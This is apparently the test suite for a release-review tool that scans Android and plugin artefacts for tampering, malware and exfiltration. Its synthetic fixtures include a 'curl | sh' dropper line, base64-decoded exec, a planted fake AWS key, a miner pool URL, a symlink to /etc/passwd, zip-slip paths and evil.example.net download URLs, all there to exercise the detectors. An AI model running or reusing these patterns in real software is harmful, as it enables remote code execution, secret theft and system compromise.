"""Unit tests on synthetic fixtures. No real release content is used."""
from __future__ import annotations

import hashlib
import io
import json
import os
import shutil
import tarfile
import zipfile
from pathlib import Path

import pytest

from review import batch, decide, profile as prof, static
from review.analysers import behaviour, manifests
from review.extract import extract
from review.findings import Finding


def _profile(**kw):
    p = prof.Profile(repo="Test/repo", hosts=list(prof.COMMON_HOSTS))
    for k, v in kw.items():
        setattr(p, k, v)
    return p


# --- extraction -----------------------------------------------------------

def test_zip_slip_and_duplicate_are_refused(tmp_path):
    z = tmp_path / "evil.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("../outside.txt", "x")
        zf.writestr("ok.txt", "a")
        zf.writestr("ok.txt", "b")
    found = extract(z, tmp_path / "out")
    rules = {f.rule for f in found}
    assert "archive.path-escape" in rules
    assert "archive.duplicate-entry" in rules
    assert not (tmp_path / "outside.txt").exists()


def test_tar_symlink_and_setuid_are_refused(tmp_path):
    t = tmp_path / "b.tar.xz"
    with tarfile.open(t, "w:xz") as tf:
        link = tarfile.TarInfo("link")
        link.type, link.linkname = tarfile.SYMTYPE, "/etc/passwd"
        tf.addfile(link)
        data = b"#!/bin/sh\n"
        su = tarfile.TarInfo("bin/tool")
        su.size, su.mode = len(data), 0o4755
        tf.addfile(su, io.BytesIO(data))
    rules = {f.rule for f in extract(t, tmp_path / "out")}
    assert {"archive.symlink", "archive.setid"} <= rules
    assert not (tmp_path / "out" / "link").exists()


# --- bundles and catalogs ---------------------------------------------------

def _bundle(tmp_path, *, tamper=False, perms=("library.read",), extra=False):
    root = tmp_path / "bundle"
    root.mkdir()
    payload = b"payload bytes"
    (root / "plugin.bin").write_bytes(payload + (b"!" if tamper else b""))
    if extra:
        (root / "dropper.sh").write_text("curl http://x | sh\n")
    manifest = {"id": "test.plugin", "version": "1.0.0", "permissions": [{"id": p} for p in perms],
                "payload": {"plugin.bin": hashlib.sha256(payload).hexdigest()},
                "homepage": "https://github.com/Test/repo"}
    (root / "manifest.json").write_text(json.dumps(manifest))
    return root


def test_bundle_hash_mismatch_is_critical(tmp_path):
    facts = {}
    found = manifests.bundle(_bundle(tmp_path, tamper=True), _profile(plugin_permissions=["library.read"]),
                             facts, "plugin-bundle")
    assert any(f.rule == "manifest.hash-mismatch" and f.severity == "critical" for f in found)


def test_bundle_unlisted_file_and_unstated_permission(tmp_path):
    facts = {}
    found = manifests.bundle(_bundle(tmp_path, perms=("library.read", "priv.shell.adb"), extra=True),
                             _profile(plugin_permissions=["library.read"]), facts, "plugin-bundle")
    rules = {(f.rule, f.severity) for f in found}
    assert ("manifest.unlisted-file", "high") in rules
    assert ("plugin-permission.not-in-purpose", "high") in rules
    assert facts["pluginPermissions"] == ["library.read", "priv.shell.adb"]
    assert "github.com" in facts["hosts"]


def test_clean_bundle_has_no_manifest_findings(tmp_path):
    found = manifests.bundle(_bundle(tmp_path), _profile(plugin_permissions=["library.read"]), {}, "plugin-bundle")
    assert found == []


def test_catalog_checks(tmp_path):
    cat = tmp_path / "catalog.json"
    cat.write_text(json.dumps({"entries": [
        {"id": "a", "version": "1", "url": "http://evil.example.net/a.tar.xz"},
        {"id": "a", "version": "1", "url": "https://github.com/x/a.tar.xz", "sha256": "0" * 64},
    ]}))
    rules = {f.rule for f in manifests.catalog(cat, _profile(), {})}
    assert {"catalog.not-https", "catalog.no-hash", "catalog.duplicate-id"} <= rules


def test_catalog_jws_payload_is_read(tmp_path):
    import base64
    body = base64.urlsafe_b64encode(json.dumps({"entries": [{"id": "x", "url": "https://github.com/a",
                                                                "sha256": "1" * 64}]}).encode()).decode().rstrip("=")
    cat = tmp_path / "catalog.json.jws"
    cat.write_text(f"eyJhbGciOiJFUzI1NiJ9.{body}.c2ln")
    facts = {}
    assert manifests.catalog(cat, _profile(), facts) == []
    assert facts["catalogEntries"] == 1


# --- endpoints, diff, dynamic -----------------------------------------------

def test_endpoints_against_profile():
    facts = {"hosts": {"github.com": "dex", "api.telegram.org": "dex", "203.0.113.9": "dex", "cdn.other.net": "x"}}
    sev = {f.location: f.severity for f in behaviour.endpoints(facts, _profile(hosts=["github.com"]))}
    assert "github.com" not in sev
    assert sev["api.telegram.org"] == "critical"
    assert sev["203.0.113.9"] == "high"
    assert sev["cdn.other.net"] == "medium"


def test_diff_flags_new_permission_and_silent_catalog_change():
    prev = {"release": "v1", "permissions": ["android.permission.INTERNET"], "package": "a.b",
            "catalogIndex": {"x": {"version": "1", "urls": ["https://a"], "sha256": "1"}}}
    cur = {"permissions": ["android.permission.INTERNET", "android.permission.READ_SMS"], "package": "a.b",
           "catalogIndex": {"x": {"version": "1", "urls": ["https://b"], "sha256": "1"}}}
    changes, found = behaviour.diff(cur, prev, _profile())
    rules = {(f.rule, f.severity) for f in found}
    assert ("diff.new-permission", "high") in rules
    assert ("diff.catalog-silent-change", "high") in rules
    assert changes["permissions"]["added"] == ["android.permission.READ_SMS"]


def test_dynamic_trace_judgement(tmp_path):
    (tmp_path / "trace.json").write_text(json.dumps({
        "package": "com.test", "installed": True, "dnsQueries": ["github.com", "pool.minexmr.com"],
        "tlsSni": [], "directIps": ["198.51.100.4"], "childProcesses": ["/system/bin/su -c id"],
        "filesWritten": ["/data/data/com.test/files/a", "/data/local/tmp/x"], "logFlags": []}))
    found = behaviour.dynamic(tmp_path, _profile(hosts=["github.com"]), {})
    sev = {(f.rule, f.location): f.severity for f in found}
    assert sev[("dynamic.contacted-host", "pool.minexmr.com")] == "critical"
    assert sev[("dynamic.direct-ip", "198.51.100.4")] == "high"
    assert sev[("dynamic.child-process", "su")] == "critical"
    assert ("dynamic.wrote-outside-own-storage", "/data/local/tmp/x") in sev
    assert not any(loc.startswith("/data/data/com.test") for _r, loc in sev)


def test_missing_trace_is_unreviewable(tmp_path):
    found = behaviour.dynamic(tmp_path, _profile(), {})
    assert found[0].category == "harness" and found[0].blocking


# --- fingerprints and the decision ------------------------------------------

def test_fingerprint_ignores_versions_and_hashes():
    a = Finding("native", "native.packed", "high", "x", location="lib/arm64-v8a/libfoo-1.2.3.so")
    b = Finding("native", "native.packed", "high", "y", location="lib/arm64-v8a/libfoo-1.2.4.so")
    assert a.fingerprint == b.fingerprint


def _rec(findings, unreviewable=False):
    fs = [f.to_dict() for f in findings]
    return {"repo": "T/r", "release": "v1", "commit": "abc", "artefacts": [], "findings": fs,
            "clean": not any(f["blocking"] for f in fs), "unreviewable": unreviewable,
            "counts": {}, "generatedAt": "t"}


BAD = Finding("apk", "api.not-in-purpose.sms", "critical", "sms", location="a.apk:sms")
OTHER = Finding("apk", "manifest.debuggable", "high", "dbg", location="b.apk:AndroidManifest.xml")


@pytest.mark.parametrize("orig,reb,err,outcome,reason", [
    ([], None, "", "approved", "clean"),
    ([Finding("apk", "x", "medium", "m")], None, "", "approved", "clean"),
    ([BAD], None, "no source", "refused", "not-rebuildable"),
    ([BAD], [], "", "rebuilt", "build"),
    ([BAD], [BAD], "", "refused", "code"),
    ([BAD], [OTHER], "", "refused", "rebuild-differs"),
])
def test_decision_table(orig, reb, err, outcome, reason):
    d = decide.decide(_rec(orig), _rec(reb) if reb is not None else None, err)
    assert (d["outcome"], d["reason"]) == (outcome, reason)
    assert decide.gate_passes(d) == (outcome in ("approved", "rebuilt"))


def test_unreviewable_is_refused_not_rebuilt():
    h = Finding("harness", "harness.tool-missing", "critical", "gitleaks missing", category="harness")
    rec = _rec([h], unreviewable=True)
    assert not decide.needs_rebuild(rec)
    assert decide.decide(rec)["reason"] == "unreviewable"


# --- batch ------------------------------------------------------------------

BODY = """## Checklist

### Droidtop/droidtop-plugin-syncthing (2)
- [ ] `plugin-build.15` 2026-10-30 pre | .droidplugin.tar.xz; signature inside archive, not inspected
- [x] `plugin-v1.0.0` 2026-10-16 | .droidplugin.tar.xz

### Droidtop/droidtop-agent (1)
- [ ] `build-130` 2026-10-31 | sha256 list only
"""
COMMENT = """- [ ] `build-128` 2026-10-31 | sha256 list only
### gamegrab-sources/catalog (1)
- [ ] `v3` 2026-10-01 | catalog
"""


def test_batch_parse_pasted_inventory_lines_and_pairs():
    items = batch.parse(BODY + COMMENT + "Droidtop/enginehost@v0.1.5\n- T/x@build-9\n", "pasted")
    keys = [i.key for i in items]
    assert "Droidtop/droidtop-agent@build-128" in keys      # heading carried down
    assert "gamegrab-sources/catalog@v3" in keys
    assert "Droidtop/enginehost@v0.1.5" in keys and "T/x@build-9" in keys
    planned = [i.key for i in batch.plan(items, repos="Droidtop/*")]
    assert "Droidtop/droidtop-plugin-syncthing@plugin-v1.0.0" not in planned   # ticked
    assert "gamegrab-sources/catalog@v3" not in planned
    assert len(batch.plan(items, limit=1)) == 1


def test_batch_from_releases_newest_first_and_exact_names():
    class FakeGH:
        def releases(self, repo):
            return [{"tag_name": "v1", "published_at": "2026-01-01"}, {"tag_name": "v3", "published_at": "2026-03-01"},
                    {"tag_name": "d", "published_at": "2026-04-01", "draft": True}]
    items = batch.from_releases(FakeGH(), "T/r")
    assert [i.tag for i in items] == ["v3", "v1"]
    with pytest.raises(SystemExit):
        batch.from_releases(FakeGH(), "T/*")


def test_profile_reason_maps_and_to_identify(tmp_path):
    root = tmp_path / "profiles"
    (root / "T").mkdir(parents=True)
    (root / "T" / "r.yml").write_text(
        "permissions:\n  android.permission.INTERNET: \"downloads\"\n"
        "native_libs:\n  libok.so: \"ours\"\n  libnrb.so: \"TO IDENTIFY: not ours\"\n"
        "explained:\n  - {rule: apkid.packer, location: \"x*.apk\", reason: r8, source: \"https://t/1\"}\n"
        "build: {command: make}\n")
    p = prof.load("T/r", root)
    assert p.permissions == ["android.permission.INTERNET"]
    assert p.lib_ok("libok.so") and not p.lib_ok("libnrb.so")
    assert p.reasons["native_libs"]["libnrb.so"].startswith("TO IDENTIFY")
    assert p.explanation("apkid.packer", "x-1.apk")["source"] == "https://t/1"
    assert p.explanation("apkid.packer", "other.apk") is None


def test_explained_needs_a_source(tmp_path):
    root = tmp_path / "profiles"
    (root / "T").mkdir(parents=True)
    (root / "T" / "r.yml").write_text("explained:\n  - {rule: apkid.packer, location: \"*\", reason: r8}\n")
    with pytest.raises(ValueError):
        prof.load("T/r", root)


def test_explained_findings_drop_to_info_and_stay_visible():
    from review.findings import apply_explained
    p = _profile(explained=[{"rule": "apkid.packer", "location": "a.apk", "reason": "R8", "source": "https://t/1"}])
    out = apply_explained([Finding("apk", "apkid.packer", "critical", "Packer.", location="a.apk"),
                           Finding("apk", "apkid.packer", "critical", "Packer.", location="b.apk")], p)
    assert out[0].severity == "info" and "Explained: R8 (https://t/1)" in out[0].title
    assert out[1].severity == "critical"


def test_code_outcome_carries_an_issue_draft_and_the_client_cannot_write():
    from review import report
    from review.gh import GitHub
    d = decide.decide(_rec([BAD]), _rec([BAD]))
    d["reportUrl"] = "https://run/1"
    draft = report.issue_draft(d)
    assert draft["repo"] == "Droidtop/tracker" and draft["labels"] == ["build-review"]
    assert BAD.fingerprint in draft["body"] and "Owning repo: T/r" in draft["body"]
    with pytest.raises(RuntimeError):
        GitHub("x")._req("POST", "/repos/Droidtop/tracker/issues", {})


# --- whole pipeline, with the real analysers --------------------------------

needs_tools = pytest.mark.skipif(not all(shutil.which(t) for t in ("gitleaks", "yara", "semgrep")),
                                 reason="analysers not installed (scripts/install-tools.sh)")


@needs_tools
def test_pipeline_finds_planted_problems(tmp_path):
    root = _bundle(tmp_path, extra=True)
    # A planted secret and a miner string, in files the manifest lists.
    (root / "config.py").write_text('import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n'
                                    'AWS = "AKIAIOSFODNN7EXAMPLQ"\nPOOL = "stratum+tcp://pool.example.net:3333"\n')
    shutil.copy("/bin/true", root / "libnative.so")
    m = json.loads((root / "manifest.json").read_text())
    for name in ("config.py", "libnative.so", "dropper.sh"):
        m["payload"][name] = hashlib.sha256((root / name).read_bytes()).hexdigest()
    (root / "manifest.json").write_text(json.dumps(m))
    art = tmp_path / "test.droidplugin.tar.xz"
    with tarfile.open(art, "w:xz") as tf:
        for p in root.iterdir():
            tf.add(p, arcname=p.name)
    rec = static.review_release([art], _profile(plugin_permissions=["library.read"], hosts=list(prof.COMMON_HOSTS)
                                                + ["github.com"]), repo="Test/repo", release="v1")
    rules = {f["rule"] for f in rec["findings"]}
    assert "yara.crypto_miner" in rules
    assert "semgrep.py-exec-of-decoded" in rules
    assert "semgrep.sh-curl-pipe-shell" in rules
    assert any(r.startswith("secret.") for r in rules)
    assert "native.unexpected-library" in rules
    assert rec["needsDynamic"] is True
    assert rec["clean"] is False


def test_profiles_parse():
    for p in Path(prof.ROOT).rglob("*.yml"):
        if any(part.startswith("_") for part in p.relative_to(prof.ROOT).parts):
            continue   # the template and the shared kinds
        repo = str(p.relative_to(prof.ROOT))[:-4]
        loaded = prof.load(repo)
        assert loaded.known and loaded.repo == repo
        assert loaded.build.get("command") or loaded.build.get("setup") in ("act", "mirror"), f"{repo} has no way to rebuild"
        assert loaded.build.get("outputs"), f"{repo} names no rebuild outputs"


@needs_tools
def test_yara_exfil_rule_wants_urls_not_domain_lists(tmp_path):
    from review.analysers.native import yara_scan
    (tmp_path / "PublicSuffixDatabase.list").write_text("trycloudflare.com\nngrok.io\nwebhook.site\n")
    (tmp_path / "Leak.smali").write_text('const-string v0, "https://abc.trycloudflare.com/up"\n')
    hits = {f.location for f in yara_scan(tmp_path, static.RULES / "yara") if f.rule == "yara.exfil_channels"}
    assert hits == {"Leak.smali"}


def test_capa_namespace_severity_longest_prefix():
    from review.analysers import native
    keys = lambda ns: max((k for k in native.CAPA_SEVERITY if ns == k or ns.startswith(k + "/")), key=len)
    assert native.CAPA_SEVERITY[keys("anti-analysis")] == "low"
    assert native.CAPA_SEVERITY[keys("anti-analysis/anti-debugging/debugger-detection")] == "high"
    assert native.CAPA_SEVERITY[keys("host-interaction/process/inject")] == "critical"


def test_placeholder_hosts_are_not_endpoints():
    facts = {"hosts": {"x": "dex", "default.url": "dex", "1.2.2.1": "dex", "evil.example.net": "dex"}}
    found = {f.location for f in behaviour.endpoints(facts, _profile())}
    assert found == {"1.2.2.1", "evil.example.net"}


def test_facts_only_review_skips_the_judging_analysers(tmp_path, monkeypatch):
    from review.analysers import content, native
    called = []
    for mod, name in ((native, "yara_scan"), (content, "secrets"), (content, "deps_artefact"), (content, "scripts")):
        monkeypatch.setattr(mod, name, lambda *a, _n=name, **k: called.append(_n) or [])
    root = _bundle(tmp_path)
    art = tmp_path / "p.droidplugin.tar.xz"
    with tarfile.open(art, "w:xz") as tf:
        for p in root.iterdir():
            tf.add(p, arcname=p.name)
    rec = static.review_release([art], _profile(plugin_permissions=["library.read"]), repo="T/r", release="prev",
                                facts_only=True)
    assert called == [] and rec["facts"]["pluginPermissions"] == ["library.read"]


def test_ip_addresses_need_a_scheme_or_port_not_oids():
    from review.analysers.apk import IP_PORT_RE
    def ips(s):
        return [m.group("ip") or m.group("ip2") for m in IP_PORT_RE.finditer(s)]
    assert ips("2.5.29.15") == [] and ips("1.2.2.1") == []
    assert ips("http://203.0.113.9/x") == ["203.0.113.9"]
    assert ips("connect 198.51.100.4:4444") == ["198.51.100.4"]


def _engine_bundle(tmp_path, tamper=None):
    from review.analysers.manifests import payload_sha256
    root = tmp_path / "core"
    (root / "lib").mkdir(parents=True)
    (root / "classes.dex").write_bytes(b"dex\n035\0" + b"x" * 20)
    (root / "lib" / "libcore.so").write_bytes(b"\x7fELF" + b"y" * 40)
    files = [{"path": p, "size": (root / p).stat().st_size, "mode": "0644",
              "sha256": hashlib.sha256((root / p).read_bytes()).hexdigest()}
             for p in ("classes.dex", "lib/libcore.so")]
    m = {"bundleId": "html-core", "engine": "html", "pluginVersion": "1.0.7-1", "apiVersion": 1,
         "files": files, "payloadSha256": payload_sha256(root, files), "lockdown": True}
    if tamper == "size":
        m["files"][0]["size"] += 1
    if tamper == "aggregate":
        m["payloadSha256"] = "0" * 64
    (root / "enginehost-bundle.json").write_text(json.dumps(m))
    (root / "enginehost-bundle.jws").write_text("a.b.c")
    return root


def test_engine_bundle_clean_and_tampered(tmp_path):
    from review.extract import kind_of
    assert manifests.bundle(_engine_bundle(tmp_path / "a"), _profile(), {}, "engine-bundle") == []
    rules = {f.rule for f in manifests.bundle(_engine_bundle(tmp_path / "b", "size"), _profile(), {}, "engine-bundle")}
    assert rules == {"manifest.size-mismatch"}   # the aggregate hashes the real bytes, so only the size check sees it
    rules = {f.rule for f in manifests.bundle(_engine_bundle(tmp_path / "c", "aggregate"), _profile(), {}, "engine-bundle")}
    assert rules == {"manifest.payload-mismatch"}
    f = tmp_path / "html-1.0.7.enginehost.tar.xz"
    f.write_bytes(b"\xfd7zXZ\0")
    assert kind_of(f) == "engine-bundle"


@pytest.mark.skipif(not (Path.home() / ".enginehost-tooling/scripts/check-bundle-conformance.py").exists(),
                    reason="Enginehost tooling not installed (scripts/install-tools.sh)")
def test_engine_bundle_runs_enginehosts_own_conformance_check(tmp_path):
    from review.analysers.manifests import payload_sha256
    root = tmp_path / "core"
    (root / "lib" / "arm64-v8a").mkdir(parents=True)
    (root / "lib" / "arm64-v8a" / "libcore.so").write_bytes(b"\x7fELF\x02\x01\x01" + b"\0" * 57)
    files = [{"path": "lib/arm64-v8a/libcore.so", "size": 64, "mode": 420,
              "sha256": hashlib.sha256((root / "lib/arm64-v8a/libcore.so").read_bytes()).hexdigest()}]
    m = {"bundleId": "x", "engine": "html", "files": files, "payloadSha256": payload_sha256(root, files)}
    (root / "enginehost-bundle.json").write_text(json.dumps(m))
    found = manifests.bundle(root, _profile(), {}, "engine-bundle")
    assert any(f.rule == "engine.conformance" and "x86_64" in f.title for f in found), [f.title for f in found]


def test_rebuild_names_outputs_and_repacks_a_core_payload(tmp_path, monkeypatch):
    import subprocess, sys as _sys
    src = tmp_path / "src"
    (src / "build" / "unsigned" / "payload").mkdir(parents=True)
    (src / "build" / "unsigned" / "payload" / "classes.dex").write_bytes(b"dex")
    (src / "build" / "unsigned" / "bundle-metadata.json").write_text("{}")
    with tarfile.open(src / "build" / "unsigned.tar", "w") as tf:
        tf.add(src / "build" / "unsigned" / "payload", arcname="payload")
        tf.add(src / "build" / "unsigned" / "bundle-metadata.json", arcname="bundle-metadata.json")
    root = tmp_path / "profiles"
    (root / "T").mkdir(parents=True)
    (root / "T" / "core.yml").write_text(
        "build:\n  command: 'true'\n  outputs: {\"build/unsigned.tar\": \"{engine-bundle}\"}\n  repack: payload\n")
    rec = tmp_path / "original.json"
    rec.write_text(json.dumps({"artefacts": [{"name": "dev.x.v1.enginehost.tar.xz", "kind": "engine-bundle"}]}))
    script = Path(__file__).resolve().parent.parent / "scripts" / "rebuild.py"
    env = dict(os.environ, BUILD_REVIEW_PROFILES=str(root), SECRET_TOKEN="x")
    r = subprocess.run([_sys.executable, str(script), "T/core", str(src), str(rec), str(tmp_path / "out")],
                       capture_output=True, text=True, env=env)
    assert "error=" not in r.stdout, r.stdout + r.stderr
    out = tmp_path / "out" / "dev.x.v1.enginehost.tar.xz"
    with tarfile.open(out) as tf:
        assert tf.getnames() == ["classes.dex"]


def test_rebuild_packs_a_plugin_build_tree(tmp_path):
    import subprocess, sys as _sys
    src = tmp_path / "src"
    (src / "out" / "x-unsigned" / "lib" / "x86_64").mkdir(parents=True)
    (src / "out" / "x-unsigned" / "manifest.json").write_text("{}")
    (src / "out" / "x-unsigned" / "classes.jar").write_bytes(b"PK")
    (src / "out" / "x-unsigned" / "lib" / "x86_64" / "liba.so").write_bytes(b"\x7fELF")
    root = tmp_path / "profiles"
    (root / "T").mkdir(parents=True)
    (root / "T" / "p.yml").write_text(
        "build:\n  command: 'true'\n  outputs: {\"out/*-unsigned\": \"{plugin-bundle}\"}\n  repack: tree\n")
    rec = tmp_path / "original.json"
    rec.write_text(json.dumps({"artefacts": [{"name": "t.p.droidplugin.tar.xz", "kind": "plugin-bundle"}]}))
    script = Path(__file__).resolve().parent.parent / "scripts" / "rebuild.py"
    r = subprocess.run([_sys.executable, str(script), "T/p", str(src), str(rec), str(tmp_path / "o")],
                       capture_output=True, text=True, env=dict(os.environ, BUILD_REVIEW_PROFILES=str(root)))
    assert "error=" not in r.stdout, r.stdout + r.stderr
    with tarfile.open(tmp_path / "o" / "t.p.droidplugin.tar.xz") as tf:
        assert sorted(tf.getnames()) == ["classes.jar", "lib/x86_64/liba.so", "manifest.json"]


def test_native_strings_give_endpoints(tmp_path):
    from review.analysers import native
    lib = tmp_path / "libx.so"
    shutil.copy("/bin/true", lib)
    with open(lib, "ab") as fh:
        fh.write(b"\0https://crash.example.net/report\0not a url: x.y\0")
    facts = {}
    native.analyse(tmp_path, _profile(), facts, capa=False)
    assert facts["hosts"].get("crash.example.net") == "libx.so"


def test_endpoints_need_a_public_suffix():
    from review.analysers.behaviour import _real_host
    assert _real_host("github.com") and _real_host("streams.videolan.org") and _real_host("203.0.113.9")
    assert not any(_real_host(h) for h in ("www.css", "www.years", "default.url", "x", "game.enginehost.local"))


def test_inner_apk_manifest_findings_do_not_block():
    from review.static import INERT_IN_BUNDLE
    assert "permission." in INERT_IN_BUNDLE and "component." in INERT_IN_BUNDLE


def test_catalog_maps_of_lists_and_objects(tmp_path):
    cat = tmp_path / "catalog.json"
    cat.write_text(json.dumps({"items": {"box64": [{"id": "1", "url": "https://github.com/a", "sha256": "1" * 64},
                                                   {"id": "2", "url": "http://evil.example.net/b"}]},
                               "files": {"base.txz": {"url": "https://github.com/c", "sha256": "2" * 64}}}))
    facts = {}
    rules = {(f.rule, f.location.split(":")[0]) for f in manifests.catalog(cat, _profile(), facts)}
    assert facts["catalogEntries"] == 3
    assert ("catalog.not-https", "box64/2") in rules and ("catalog.no-hash", "box64/2") in rules


def test_catalog_text_mentioning_a_url_is_not_a_download(tmp_path):
    cat = tmp_path / "catalog.json"
    cat.write_text(json.dumps({"files": {"a.tzst": {"url": "https://github.com/a", "sha256": "1" * 64,
                                                    "licence": "MIT (see https://example.org/LICENSE)"}}}))
    assert manifests.catalog(cat, _profile(), {}) == []


@pytest.mark.skipif(not (shutil.which("zstd") and shutil.which("bsdtar")), reason="zstd or bsdtar not installed")
def test_zstd_component_archives_unpack(tmp_path):
    import subprocess
    (tmp_path / "in").mkdir()
    (tmp_path / "in" / "a.txt").write_text("x")
    with tarfile.open(tmp_path / "c.tar", "w") as tf:
        tf.add(tmp_path / "in" / "a.txt", arcname="a.txt")
    subprocess.run(["zstd", "-q", str(tmp_path / "c.tar"), "-o", str(tmp_path / "c.tzst")], check=True)
    from review.extract import kind_of
    assert kind_of(tmp_path / "c.tzst") == "archive"
    assert extract(tmp_path / "c.tzst", tmp_path / "out") == []
    assert (tmp_path / "out" / "a.txt").read_text() == "x"


@pytest.mark.skipif(not shutil.which("bsdtar"), reason="bsdtar not installed")
def test_bsdtar_packages_rooted_at_slash_but_dotdot_refused(tmp_path):
    import subprocess
    (tmp_path / "d").mkdir()
    (tmp_path / "d" / "ok.txt").write_text("x")
    # A cpio package naming a file from the root lands under dest.
    subprocess.run(["bsdtar", "-c", "-f", str(tmp_path / "a.cpio"), "--format=cpio", "-P", "-C", str(tmp_path),
                    "d/ok.txt", str(tmp_path / "d" / "ok.txt")], check=True)
    assert extract(tmp_path / "a.cpio", tmp_path / "out") == []
    assert (tmp_path / "out" / str(tmp_path).lstrip("/") / "d" / "ok.txt").exists()
    # A ".." still leaves it, and is still refused.
    (tmp_path / "e").mkdir()
    subprocess.run(["bsdtar", "-c", "-f", str(tmp_path / "b.cpio"), "--format=cpio", "-P", "-C", str(tmp_path / "e"),
                    "../d/ok.txt"], check=True)
    found = extract(tmp_path / "b.cpio", tmp_path / "out2")
    assert any(f.rule == "archive.path-escape" for f in found)


def test_java_class_files_are_not_mach_o(tmp_path):
    from review.analysers.native import is_native
    cls = tmp_path / "A.class"
    cls.write_bytes(b"\xca\xfe\xba\xbe\x00\x00\x00\x34" + b"\0" * 32)       # Java 8 class
    fat = tmp_path / "tool"
    fat.write_bytes(b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + b"\0" * 32)       # universal Mach-O, 2 archs
    assert not is_native(cls) and is_native(fat)


def test_16_bit_ne_fonts_are_not_native_code(tmp_path):
    from review.analysers.native import is_native
    ne = tmp_path / "coure.fon"
    data = bytearray(b"MZ" + b"\0" * 0x3a + (0x80).to_bytes(4, "little") + b"\0" * (0x80 - 0x40) + b"NE" + b"\0" * 30)
    ne.write_bytes(bytes(data))
    pe = tmp_path / "a.dll"
    pe.write_bytes(bytes(data[:0x80]) + b"PE\0\0" + b"\0" * 30)
    assert not is_native(ne) and is_native(pe)
